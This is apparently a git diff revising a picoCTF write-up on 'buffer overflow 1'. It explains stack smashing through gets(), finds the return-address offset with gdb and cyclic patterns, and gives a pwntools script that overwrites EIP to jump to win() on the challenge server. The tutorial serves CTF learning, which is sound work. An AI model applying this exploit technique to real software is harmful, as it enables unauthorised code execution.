@@ -2,10 +2,10 @@
 ### Description
 Control the return address \
 Now we're cooking! You can overflow the buffer and return to the flag function in the  [program](https://artifacts.picoctf.net/c/253/vuln). \
-You can view source [here](https://artifacts.picoctf.net/c/253/vuln.c). And connect with it using  `nc saturn.picoctf.net [PORT_REDACTED]`
+You can view source [here](https://artifacts.picoctf.net/c/253/vuln.c). And connect with it using  `nc saturn.picoctf.net [PORT]`
 
-### Detailed Solution
 Let's check out our source code:
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -50,11 +50,27 @@ int main(int argc, char **argv){
 }
 ```
 
-In the `vuln()` function, we see that the `gets()` function is being used. If you're new to binary exploitation, `gets()` is imfamous for being able to store more input than allocated, overflowing the buffer and writing onto the "stack". Because of this, we are able to write our own addresses onto the stack and change the return address to `win()`.
+In the `vuln()` function, we see that once again, the `gets()` function is being used. However, instead of triggering a segmentation fault like <kbd>Buffer overflow 0</kbd>, we will instead utilize its vulnerability to write our own addresses onto the stack, changing the return address to `win()` instead.
 
-To start, we first need to figure out our "offset". The offset is just the distance between the beginning of the buffer and the position of the address we need to overwrite. Since this binary is in x32, the address will be stored in the `$eip` register. This can be visualized with the `gdb` utility:
+### Part I: Explaining the Stack
 
-```
+Before we get into the code, we need to figure out how to write our own addresses to the stack. Let's start with a visual:
+
+![Stack Visualization](https://enscribe.dev/asset/pico/buffer-overflow-0-1/stack-visual.png)
+
+Whenever we call a function, multiple items will be "pushed" onto the **top** of the stack (in the diagram, that will be on the right-most side). It will include any parameters, a return address back to `main()`, a base pointer, and a buffer. Note that the stack grows **downwards**, towards lower memory addresses, but the buffer is written **upwards**, towards higher memory addresses.
+
+We can "smash the stack" by exploiting the `gets()` function. If we pass in a large enough input, it will overwrite the entire buffer and start overflowing into the base pointer and return address within the stack:
+
+![Overflow Visualization](https://enscribe.dev/asset/pico/buffer-overflow-0-1/overflow-visual.png)
+
+If we are delibrate of the characters we pass into `gets()`, we will be able to insert a new address to overwrite the return address to `win()`. Let's try!
+
+### Part II: Smashing the Stack
+
+To start, we first need to figure out our "offset". The offset is the distance, in characters, between the beginning of the buffer and the position of the `$eip`. This can be visualized with the `gdb-gef` utility by setting a breakpoint (a place to pause the runtime) in the `main()` function:
+
+```text
 gef➤  b main
 Breakpoint 1 at 0x80492d7
 gef➤  r
@@ -85,8 +101,10 @@ $eip   : 0x80492d7  →  <main+19> sub esp, 0x10
 ─────────────────────────────────────────────────────────────────── threads ────
 [#0] Id 1, Name: "vuln", stopped 0x80492d7 in main (), reason: BREAKPOINT
 ```
-Analyzing this breakpoint, if you look at the arrow on the assembly code, you can see that its address is the exact same as the `$eip` (`0x80492d7`). We can overflow this register by passing in a bunch of `A`s into the code. Let's try it:
-```
+
+Analyzing this breakpoint, if you look at the arrow on the assembly code, you can see that its address is the exact same as the `$eip` (`0x80492d7`). Let's try overflowing this register by passing an unhealthy amount of `A`s into the program:
+
+```text
 gef➤  r
 Starting program: /home/kali/pico22/buffer-overflow-1/vuln 
 Please enter your string: 
@@ -112,8 +130,14 @@ $eip   : 0x41414141 ("AAAA"?)
 ─────────────────────────────────────────────────────────────────── threads ────
 [#0] Id 1, Name: "vuln", stopped 0x41414141 in ?? (), reason: SIGSEGV
 ```
-Look what happened: all of our registers just got overflowed with our `A`s in ASCII (`0x41` = `A`), including the `$eip`! However, we don't know **how many** `A`s we need to pass in order to reach the `$eip`. To solve this problem, we can use the pwntools `cyclic` command. This creates a recognizable cycling pattern for it to identify:
-```
+
+Look what happened: our program threw a SIGSEGV (segmentation) fault, as it is trying to reference the address `0x41414141`, which doesn't exist! This is because our `$eip` was overwritten by all our `A`s (`0x41` in ASCII = `A` in text).
+
+### Part III: Smashing the Stack (with finesse)
+
+Although we've managed to smash the stack, we still dont' know the offset (**how many** `A`s we need to pass in order to reach the `$eip`). To solve this problem, we can use the pwntools `cyclic` command, which creates a string with a recognizable cycling pattern for it to identify:
+
+```text
 gef➤  shell cyclic 150
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
 gef➤  r
@@ -141,44 +165,59 @@ $eip   : 0x6161616c ("laaa"?)
 ─────────────────────────────────────────────────────────────────── threads ────
 [#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
 ```
+
 We can see that `$eip` is currently overflowed with the pattern `0x6161616c` (`laaa`). let's search for this pattern using `pattern search`:
-```
+
+```text
 gef➤  pattern search 0x6161616c
 [+] Searching for '0x6161616c'
 [+] Found at offset 44 (little-endian search) likely
 [+] Found at offset 41 (big-endian search)
 ```
+
 To figure out which offset we need to use, we can use `readelf` to analyze header of the `vuln` executable:
-```
+
+```text
 kali@kali:~/pico22/buffer-overflow-1$ readelf -h vuln | grep endian
   Data:                              2's complement, little endian
+```
 
-```
-Our binary is in little endian, we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the function we need to jump to in order to get the flag. This would be `win()`:
-```
+Our binary is in little endian, we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the `win()` function, which will be appended to the end of our buffer to overwrite the `$eip` on the stack:
+
+```text
 gef➤  x win
-0x80491f6 <win>:	0xfb1e0ff3
+0x80491f6 <win>: 0xfb1e0ff3
 ```
-Win is at `0x80491f6`. We can now make a simple exploit that connects to the server and prints the flag using Python and pwntools:
+
+Win is at `0x80491f6`, but we need to convert it to the little endian format. You can do this with the pwntools `p32()` command, which results in `\xf6\x91\x04\x08`.
+Let's make a final visual of our payload:
+
+![Payload Visual](https://enscribe.dev/asset/pico/buffer-overflow-0-1/payload-visual.png)
+
+Let's write our payload and send it to the remote server with Python3/pwntools:
+
 ```py
 from pwn import *
-payload = b"A"*44 + p32(0x80491f6)        # The p32 function prints this address as little endian (b'\xf6\x91\x04\x08').
-host, port = "saturn.picoctf.net", [PORT_REDACTED]
+payload = b"A"*44 + p32(0x80491f6)        # Prints the address as little endian (b'\xf6\x91\x04\x08').
+host, port = "saturn.picoctf.net", [PORT]
 
 p = remote(host, port)                    # Opens the connection
-log.info(p.readS())                       # Decodes/prints "Please enter your string:"
+log.info(p.recvS())                       # Decodes/prints "Please enter your string:"
 p.sendline(payload)                       # Sends the payload
-log.success(p.readallS())                 # Decodes/prints all program outputs
+log.success(p.recvallS())                 # Decodes/prints all program outputs
 p.close()                                 # Closes the connection
 ```
+
 Let's try running the script on the server:
-```
-kali@kali:~/pico22/buffer-overflow-1$ python3 exp2.py
-[+] Opening connection to saturn.picoctf.net on port [PORT_REDACTED]: Done
+
+```text
+kali@kali:~/pico22/buffer-overflow-1$ python3 exp.py
+[+] Opening connection to saturn.picoctf.net on port [PORT]: Done
 [*] Please enter your string: 
 [+] Receiving all data: Done (100B)
-[*] Closed connection to saturn.picoctf.net port [PORT_REDACTED]
+[*] Closed connection to saturn.picoctf.net port [PORT]
 [+] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
     picoCTF{addr3ss3s_ar3_3asy_********}
 ```
+
 You have completed your first `ret2win` buffer overflow on a x32 binary!
